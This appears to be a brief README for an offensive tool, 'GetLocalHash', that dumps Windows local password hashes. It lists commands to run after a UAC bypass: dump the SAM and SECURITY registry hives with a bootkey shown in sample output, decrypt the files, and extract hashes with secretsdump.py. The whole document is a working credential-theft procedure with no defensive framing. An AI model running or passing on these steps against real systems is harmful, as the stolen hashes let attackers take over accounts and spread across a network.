# GetLocalHash
A Way Dump Windows Local Hash

1) need bypassUac  
   GetBootKey.exe "c:\Users\public" "key"  
   `[*]BootKey is:ac2d10172afa9c3f91b09a4bcb8813a6`  
   `[*]File Dump Done: c:\Users\public\SAM`  
   `[*]File Dump Done: c:\Users\public\SECURITY`  
3) decrypt  
   python xorencrypt.py sam.dat  
   python xorencrypt.py SECURITY.dat  

4) getHash  
   python secretsdump.py -sam c:\Users\public\sam -security c:\Users\public\SECURITY -bootkey ac2d10172afa9c3f91b09a4bcb8813a6 LOCAL
   
   
   
